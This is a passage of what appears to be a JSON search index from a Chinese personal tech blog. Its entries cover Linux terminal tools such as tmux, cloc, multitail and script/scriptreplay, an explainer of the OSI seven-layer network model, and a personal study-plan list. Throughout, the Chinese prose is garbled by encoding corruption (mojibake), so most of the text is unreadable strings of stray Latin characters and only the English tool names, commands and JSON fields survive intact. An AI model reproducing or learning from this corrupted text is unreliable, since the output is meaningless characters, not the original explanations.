http://centos.ustc.edu.cn/centos/7/isos/x86_64/CentOS-7-x86_64-Minimal-1511.iso Jã€sz&#x2F;rz ï¼š äº¤äº’å¼æ–‡ä»¶ä¼ è¾“ï¼Œåœ¨å¤šé‡è·³æ¿æœºä¸‹ä¼ è¾“æ–‡ä»¶éå¸¸å¥½ç”¨ï¼Œä¸ç”¨ä¸€çº§ä¸€çº§ä¼ è¾“ã€‚Kã€cloc ï¼šä»£ç ç»Ÿè®¡å·¥å…·ï¼Œèƒ½å¤Ÿç»Ÿè®¡ä»£ç çš„ç©ºè¡Œæ•°ã€æ³¨é‡Šè¡Œã€ç¼–ç¨‹è¯­è¨€ã€‚ Lã€tmux ï¼šç»ˆç«¯å¤ç”¨å·¥å…·ï¼Œæ›¿ä»£screenã€nohupã€‚ Mã€script&#x2F;scriptreplay : ç»ˆç«¯ä¼šè¯å½•åˆ¶ã€‚eg1ï¼šå½•åˆ¶script -t 2&gt;time.txt session.typescript æ‰§è¡Œåå¼€å§‹å½•åˆ¶ï¼Œä¸‹é¢ä½ æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œéƒ½å¯è¢«è®°å½•#your commands#å½•åˆ¶ç»“æŸexit#å›æ”¾ï¼šscriptreplay -t time.txt session.typescript Nã€multitail ï¼šå¤šé‡ tailã€‚é€šå¸¸ä½ ä¸æ­¢ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶è¦ç›‘æ§ï¼Œæ€ä¹ˆåŠï¼Ÿ ç»ˆç«¯è½¯ä»¶é‡Œå¼€å¤šä¸ª tab å¤ªå åœ°æ–¹ï¼Œå¯ä»¥è¯•è¯•è¿™ä¸ªå·¥å…·ï¼š","categories":[],"tags":[]},{"title":"isoä¸ƒå±‚æ¨¡å‹","slug":"isoä¸ƒå±‚æ¨¡å‹","date":"2022-11-08T16:01:03.000Z","updated":"2023-12-02T12:27:31.800Z","comments":true,"path":"2022/11/09/isoä¸ƒå±‚æ¨¡å‹/","link":"","permalink":"http://example.com/2022/11/09/iso%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/","excerpt":"ä¸€ã€æ˜¯ä»€ä¹ˆOSI ï¼ˆOpen System Interconnectï¼‰æ¨¡å‹å…¨ç§°ä¸ºå¼€æ”¾å¼é€šä¿¡ç³»ç»Ÿäº’è¿å‚è€ƒæ¨¡å‹ï¼Œæ˜¯å›½é™…æ ‡å‡†åŒ–ç»„ç»‡ ( ISO ) æå‡ºçš„ä¸€ä¸ªè¯•å›¾ä½¿å„ç§è®¡ç®—æœºåœ¨ä¸–ç•ŒèŒƒå›´å†…äº’è¿ä¸ºç½‘ç»œçš„æ ‡å‡†æ¡†æ¶ OSIå°†è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„åˆ’åˆ†ä¸ºä¸ƒå±‚ï¼Œæ¯ä¸€å±‚å®ç°å„è‡ªçš„åŠŸèƒ½å’Œåè®®ï¼Œå¹¶å®Œæˆä¸ç›¸é‚»å±‚çš„æ¥å£é€šä¿¡ã€‚å³æ¯ä¸€å±‚æ‰®æ¼”å›ºå®šçš„è§’è‰²ï¼Œäº’ä¸æ‰“æ‰°","text":"ä¸€ã€æ˜¯ä»€ä¹ˆOSI ï¼ˆOpen System Interconnectï¼‰æ¨¡å‹å…¨ç§°ä¸ºå¼€æ”¾å¼é€šä¿¡ç³»ç»Ÿäº’è¿å‚è€ƒæ¨¡å‹ï¼Œæ˜¯å›½é™…æ ‡å‡†åŒ–ç»„ç»‡ ( ISO ) æå‡ºçš„ä¸€ä¸ªè¯•å›¾ä½¿å„ç§è®¡ç®—æœºåœ¨ä¸–ç•ŒèŒƒå›´å†…äº’è¿ä¸ºç½‘ç»œçš„æ ‡å‡†æ¡†æ¶ OSIå°†è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„åˆ’åˆ†ä¸ºä¸ƒå±‚ï¼Œæ¯ä¸€å±‚å®ç°å„è‡ªçš„åŠŸèƒ½å’Œåè®®ï¼Œå¹¶å®Œæˆä¸ç›¸é‚»å±‚çš„æ¥å£é€šä¿¡ã€‚å³æ¯ä¸€å±‚æ‰®æ¼”å›ºå®šçš„è§’è‰²ï¼Œäº’ä¸æ‰“æ‰° äºŒã€åˆ’åˆ†OSIä¸»è¦åˆ’åˆ†äº†ä¸ƒå±‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åº”ç”¨å±‚åº”ç”¨å±‚ä½äº OSI å‚è€ƒæ¨¡å‹çš„ç¬¬ä¸ƒå±‚ï¼Œå…¶ä½œç”¨æ˜¯é€šè¿‡åº”ç”¨ç¨‹åºé—´çš„äº¤äº’æ¥å®Œæˆç‰¹å®šçš„ç½‘ç»œåº”ç”¨ è¯¥å±‚åè®®å®šä¹‰äº†åº”ç”¨è¿›ç¨‹ä¹‹é—´çš„äº¤äº’è§„åˆ™ï¼Œé€šè¿‡ä¸åŒçš„åº”ç”¨å±‚åè®®ä¸ºä¸åŒçš„ç½‘ç»œåº”ç”¨æä¾›æœåŠ¡ã€‚ä¾‹å¦‚åŸŸåç³»ç»Ÿ DNSï¼Œæ”¯æŒä¸‡ç»´ç½‘åº”ç”¨çš„ HTTP åè®®ï¼Œç”µå­é‚®ä»¶ç³»ç»Ÿé‡‡ç”¨çš„ SMTPåè®®ç­‰ åœ¨åº”ç”¨å±‚äº¤äº’çš„æ•°æ®å•å…ƒæˆ‘ä»¬ç§°ä¹‹ä¸ºæŠ¥æ–‡ è¡¨ç¤ºå±‚è¡¨ç¤ºå±‚çš„ä½œç”¨æ˜¯ä½¿é€šä¿¡çš„åº”ç”¨ç¨‹åºèƒ½å¤Ÿè§£é‡Šäº¤æ¢æ•°æ®çš„å«ä¹‰ï¼Œå…¶ä½äº OSIå‚è€ƒæ¨¡å‹çš„ç¬¬å…­å±‚ï¼Œå‘ä¸Šä¸ºåº”ç”¨å±‚æä¾›æœåŠ¡ï¼Œå‘ä¸‹æ¥æ”¶æ¥è‡ªä¼šè¯å±‚çš„æœåŠ¡ è¯¥å±‚æä¾›çš„æœåŠ¡ä¸»è¦åŒ…æ‹¬æ•°æ®å‹ç¼©ï¼Œæ•°æ®åŠ å¯†ä»¥åŠæ•°æ®æè¿°ï¼Œä½¿åº”ç”¨ç¨‹åºä¸å¿…æ‹…å¿ƒåœ¨å„å°è®¡ç®—æœºä¸­è¡¨ç¤ºå’Œå­˜å‚¨çš„å†…éƒ¨æ ¼å¼å·®å¼‚ ä¼šè¯å±‚ä¼šè¯å±‚å°±æ˜¯è´Ÿè´£å»ºç«‹ã€ç®¡ç†å’Œç»ˆæ­¢è¡¨ç¤ºå±‚å®ä½“ä¹‹é—´çš„é€šä¿¡ä¼šè¯ è¯¥å±‚æä¾›äº†æ•°æ®äº¤æ¢çš„å®šç•Œå’ŒåŒæ­¥åŠŸèƒ½ï¼ŒåŒ…æ‹¬äº†å»ºç«‹æ£€æŸ¥ç‚¹å’Œæ¢å¤æ–¹æ¡ˆçš„æ–¹æ³• ä¼ è¾“å±‚ä¼ è¾“å±‚çš„ä¸»è¦ä»»åŠ¡æ˜¯ä¸ºä¸¤å°ä¸»æœºè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡æä¾›æœåŠ¡ï¼Œå¤„ç†æ•°æ®åŒ…é”™è¯¯ã€æ•°æ®åŒ…æ¬¡åºï¼Œä»¥åŠå…¶ä»–ä¸€äº›å…³é”®ä¼ è¾“é—®é¢˜ ä¼ è¾“å±‚å‘é«˜å±‚å±è”½äº†ä¸‹å±‚æ•°æ®é€šä¿¡çš„ç»†èŠ‚ã€‚å› æ­¤ï¼Œå®ƒæ˜¯è®¡ç®—æœºé€šä¿¡ä½“ç³»ç»“æ„ä¸­å…³é”®çš„ä¸€å±‚ å…¶ä¸­ï¼Œä¸»è¦çš„ä¼ è¾“å±‚åè®®æ˜¯TCPå’ŒUDP ç½‘ç»œå±‚ä¸¤å°è®¡ç®—æœºä¹‹é—´ä¼ é€æ•°æ®æ—¶å…¶é€šä¿¡é“¾è·¯å¾€å¾€ä¸æ­¢ä¸€æ¡ï¼Œæ‰€ä¼ è¾“çš„ä¿¡æ¯ç”šè‡³å¯èƒ½ç»è¿‡å¾ˆå¤šé€šä¿¡å­ç½‘ ç½‘ç»œå±‚çš„ä¸»è¦ä»»åŠ¡å°±æ˜¯é€‰æ‹©åˆé€‚çš„ç½‘é—´è·¯ç”±å’Œäº¤æ¢èŠ‚ç‚¹ï¼Œç¡®ä¿æ•°æ®æŒ‰æ—¶æˆåŠŸä¼ é€ åœ¨å‘é€æ•°æ®æ—¶ï¼Œç½‘ç»œå±‚æŠŠä¼ è¾“å±‚äº§ç”Ÿçš„æŠ¥æ–‡æˆ–ç”¨æˆ·æ•°æ®æŠ¥å°è£…æˆåˆ†ç»„å’ŒåŒ…ï¼Œå‘ä¸‹ä¼ è¾“åˆ°æ•°æ®é“¾è·¯å±‚ åœ¨ç½‘ç»œå±‚ä½¿ç”¨çš„åè®®æ˜¯æ— è¿æ¥çš„ç½‘é™…åè®®ï¼ˆInternet Protocolï¼‰å’Œè®¸å¤šè·¯ç”±åè®®ï¼Œå› æ­¤æˆ‘ä»¬é€šå¸¸æŠŠè¯¥å±‚ç®€å•åœ°ç§°ä¸º IP å±‚ æ•°æ®é“¾è·¯å±‚æ•°æ®é“¾è·¯å±‚é€šå¸¸ä¹Ÿå«åšé“¾è·¯å±‚ï¼Œåœ¨ç‰©ç†å±‚å’Œç½‘ç»œå±‚ä¹‹é—´ã€‚ä¸¤å°ä¸»æœºä¹‹é—´çš„æ•°æ®ä¼ è¾“ï¼Œæ€»æ˜¯åœ¨ä¸€æ®µä¸€æ®µçš„é“¾è·¯ä¸Šä¼ é€çš„ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨ä¸“é—¨çš„é“¾è·¯å±‚åè®® åœ¨ä¸¤ä¸ªç›¸é‚»èŠ‚ç‚¹ä¹‹é—´ä¼ é€æ•°æ®æ—¶ï¼Œæ•°æ®é“¾è·¯å±‚å°†ç½‘ç»œå±‚äº¤ä¸‹æ¥çš„ IPæ•°æ®æŠ¥ç»„è£…æˆå¸§ï¼Œåœ¨ä¸¤ä¸ªç›¸é‚»èŠ‚ç‚¹é—´çš„é“¾è·¯ä¸Šä¼ é€å¸§ æ¯ä¸€å¸§çš„æ•°æ®å¯ä»¥åˆ†æˆï¼šæŠ¥å¤´headå’Œæ•°æ®dataä¸¤éƒ¨åˆ†: head æ ‡æ˜æ•°æ®å‘é€è€…ã€æ¥å—è€…ã€æ•°æ®ç±»å‹ï¼Œå¦‚ MACåœ°å€data å­˜å‚¨äº†è®¡ç®—æœºä¹‹é—´äº¤äº’çš„æ•°æ®é€šè¿‡æ§åˆ¶ä¿¡æ¯æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªå¸§çš„èµ·æ­¢æ¯”ç‰¹ä½ç½®ï¼Œæ­¤å¤–ï¼Œä¹Ÿèƒ½ä½¿æ¥æ”¶ç«¯æ£€æµ‹å‡ºæ‰€æ”¶åˆ°çš„å¸§æœ‰æ— å·®é”™ï¼Œå¦‚æœå‘ç°å·®é”™ï¼Œæ•°æ®é“¾è·¯å±‚èƒ½å¤Ÿç®€å•çš„ä¸¢å¼ƒæ‰è¿™ä¸ªå¸§ï¼Œä»¥é¿å…ç»§ç»­å ç”¨ç½‘ç»œèµ„æº ç‰©ç†å±‚ä½œä¸ºOSI å‚è€ƒæ¨¡å‹ä¸­æœ€ä½çš„ä¸€å±‚ï¼Œç‰©ç†å±‚çš„ä½œç”¨æ˜¯å®ç°è®¡ç®—æœºèŠ‚ç‚¹ä¹‹é—´æ¯”ç‰¹æµçš„é€æ˜ä¼ é€ è¯¥å±‚çš„ä¸»è¦ä»»åŠ¡æ˜¯ç¡®å®šä¸ä¼ è¾“åª’ä½“çš„æ¥å£çš„ä¸€äº›ç‰¹æ€§ï¼ˆæœºæ¢°ç‰¹æ€§ã€ç”µæ°”ç‰¹æ€§ã€åŠŸèƒ½ç‰¹æ€§ï¼Œè¿‡ç¨‹ç‰¹æ€§ï¼‰ è¯¥å±‚ä¸»è¦æ˜¯å’Œç¡¬ä»¶æœ‰å…³ï¼Œä¸è½¯ä»¶å…³ç³»ä¸å¤§ ä¸‰ã€ä¼ è¾“è¿‡ç¨‹æ•°æ®åœ¨å„å±‚ä¹‹é—´çš„ä¼ è¾“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åº”ç”¨å±‚æŠ¥æ–‡è¢«ä¼ é€åˆ°è¿è¾“å±‚åœ¨æœ€ç®€å•çš„æƒ…å†µä¸‹ï¼Œè¿è¾“å±‚æ”¶å–åˆ°æŠ¥æ–‡å¹¶é™„ä¸Šé™„åŠ ä¿¡æ¯ï¼Œè¯¥é¦–éƒ¨å°†è¢«æ¥æ”¶ç«¯çš„è¿è¾“å±‚ä½¿ç”¨åº”ç”¨å±‚æŠ¥æ–‡å’Œè¿è¾“å±‚é¦–éƒ¨ä¿¡æ¯ä¸€é“æ„æˆäº†è¿è¾“å±‚æŠ¥æ–‡æ®µã€‚é™„åŠ çš„ä¿¡æ¯å¯èƒ½åŒ…æ‹¬ï¼šå…è®¸æ¥æ”¶ç«¯è¿è¾“å±‚å‘ä¸Šå‘é€‚å½“çš„åº”ç”¨ç¨‹åºäº¤ä»˜æŠ¥æ–‡çš„ä¿¡æ¯ä»¥åŠå·®é”™æ£€æµ‹ä½ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯è®©æ¥æ”¶ç«¯èƒ½å¤Ÿåˆ¤æ–­æŠ¥æ–‡ä¸­çš„æ¯”ç‰¹æ˜¯å¦åœ¨é€”ä¸­å·²è¢«æ”¹å˜è¿è¾“å±‚åˆ™å‘ç½‘ç»œå±‚ä¼ é€’è¯¥æŠ¥æ–‡æ®µï¼Œç½‘ç»œå±‚å¢åŠ äº†å¦‚æºå’Œç›®çš„ç«¯ç³»ç»Ÿåœ°å€ç­‰ç½‘ç»œå±‚é¦–éƒ¨ä¿¡æ¯ï¼Œç”Ÿæˆäº†ç½‘ç»œå±‚æ•°æ®æŠ¥ç½‘ç»œå±‚æ•°æ®æŠ¥æ¥ä¸‹æ¥è¢«ä¼ é€’ç»™é“¾è·¯å±‚ï¼Œåœ¨æ•°æ®é“¾è·¯å±‚æ•°æ®åŒ…æ·»åŠ å‘é€ç«¯ MAC åœ°å€å’Œæ¥æ”¶ç«¯ MAC åœ°å€åè¢«å°è£…æˆæ•°æ®å¸§åœ¨ç‰©ç†å±‚æ•°æ®å¸§è¢«å°è£…æˆæ¯”ç‰¹æµï¼Œä¹‹åé€šè¿‡ä¼ è¾“ä»‹è´¨ä¼ é€åˆ°å¯¹ç«¯å¯¹ç«¯å†ä¸€æ­¥æ­¥è§£å¼€å°è£…ï¼Œè·å–åˆ°ä¼ é€çš„æ•°æ®","categories":[],"tags":[]},{"title":"æ¸…å•","slug":"å­¦ä¹ è®¡åˆ’","date":"2020-11-11T13:14:40.000Z","updated":"2024-01-10T07:36:12.599Z","comments":true,"path":"2020/11/11/å­¦ä¹ è®¡åˆ’/","link":"","permalink":"http://example.com/2020/11/11/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/","excerpt":"ç½‘ç»œåˆçº§è¿ç»´çŸ¥è¯†å­¦ä¹  é’ˆå¯¹linuxè¿ç»´è¿›è¡Œå­¦ä¹  phpå­¦ä¹  æ“ä½œç³»ç»Ÿå­¦ä¹  æ•°æ®ç»“æ„ä¸ç®—æ³• è‹±è¯­ é˜…è¯»archWiki ç¼–è¯‘inuxå†…æ ¸å¹¶åŠ å…¥è‡ªå·±çš„ä¸œè¥¿ ç¼–è¯‘åŸç† webå®‰å…¨ æ±‡ç¼– x86 åµŒå…¥å¼çš„ä¸šä½™å­¦ä¹  è®¡ç®—æœºç»„æˆåŸç† tcp&#x2F;ipæ·±å…¥å­¦ä¹  github åšä¸€ä¸ªä¸­å‹é¡¹ç›®ã€‚","text":"ç½‘ç»œåˆçº§è¿ç»´çŸ¥è¯†å­¦ä¹  é’ˆå¯¹linuxè¿ç»´è¿›è¡Œå­¦ä¹  phpå­¦ä¹  æ“ä½œç³»ç»Ÿå­¦ä¹  æ•°æ®ç»“æ„ä¸ç®—æ³• è‹±è¯­ é˜…è¯»archWiki ç¼–è¯‘inuxå†…æ ¸å¹¶åŠ å…¥è‡ªå·±çš„ä¸œè¥¿ ç¼–è¯‘åŸç† webå®‰å…¨ æ±‡ç¼– x86 åµŒå…¥å¼çš„ä¸šä½™å­¦ä¹  è®¡ç®—æœºç»„æˆåŸç† tcp&#x2F;ipæ·±å…¥å­¦ä¹  github åšä¸€ä¸ªä¸­å‹é¡¹ç›®ã€‚ å°è¯•æ¸…å•ï¼šflipper zero esp32 æ™ºèƒ½æ‰‹è¡¨ ä¸‹é¢æ˜¯æœªè§£å†³é—®é¢˜æ¸…å•ï¼šhttp://frozenfish0x.github.io/2020/12/17/problem/","categories":[],"tags":[]}],"categories":[],"tags":[]}